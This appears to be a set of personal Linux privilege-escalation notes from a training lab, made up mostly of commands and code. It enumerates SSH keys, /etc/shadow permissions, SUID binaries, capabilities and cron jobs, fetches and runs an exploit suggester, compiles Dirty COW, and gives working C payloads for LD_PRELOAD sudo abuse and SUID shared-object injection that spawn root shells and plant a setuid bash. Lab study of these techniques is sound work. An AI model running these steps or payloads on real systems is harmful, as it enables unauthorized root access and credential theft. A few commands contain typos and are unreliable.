# Check id
id

# check who are you
whoami

# Check all the file you can read
ls -arh

# check weak file permission
ls -la /etc/shadow

# Check ssh key 
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
can search for the pattern

# find suid file
find / -perm -u=\s -type f 2>/dev/null
after saving the suid go through all the lib with gtfbin.io

# capicity
getcap -r 2>/dev/null

# cronjob
# check all the posibble.
crontab -l 
cat /etc/crontab

# kernel exploit
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh

# dirty cow
https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
gcc -pthread cow.c -o cow
./cow

# LD_PRELOAD on the enviroment
Linux VM

1. In command prompt type: sudo -l
2. From the output, notice that the LD_PRELOAD environment variable is intact.

``` Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
```

Exploitation

1. Open a text editor and type:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Save the file as x.c
3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
5. In command prompt type: id

# SUID sharing object injection
Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
4. From the output, notice that a .so file is missing from a writable directory.

Exploitation

Linux VM

Note that the folder should be writable 
5. In command prompt type: mkdir /home/user/.config
6. In command prompt type: cd /home/user/.config
7. Open a text editor and type:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
8. Save the file as libcalc.c
9. In command prompt type:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
10. In command prompt type: /usr/local/bin/suid-so
11. In command prompt type: id
